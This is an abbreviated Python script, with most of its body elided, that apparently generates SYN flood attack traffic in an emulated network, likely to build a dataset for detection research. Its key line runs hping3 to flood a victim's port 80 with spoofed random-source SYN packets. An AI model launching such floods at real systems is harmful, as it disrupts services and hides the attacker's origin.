#!/usr/bin/env python3
"""
Generate SYN Flood Attack with IPv4 Traffic
...
class SynFloodIPv4Generator:
    ...
    def generate_attack(self):
        """Generate SYN flood attack with IPv4"""
        ...
        while total_sent < self.n_samples:
            ...
            # Use -4 flag to force IPv4, limit count to avoid hanging
            attacker.cmd(f'timeout 10 hping3 -4 -S -p 80 --faster --rand-source -c {remaining} {victim.IP()} > /dev/null 2>&1')
...
def main():
    parser = argparse.ArgumentParser(description='Generate SYN flood attack traffic (IPv4)')
    ...
    generator = SynFloodIPv4Generator(args.output, args.samples)
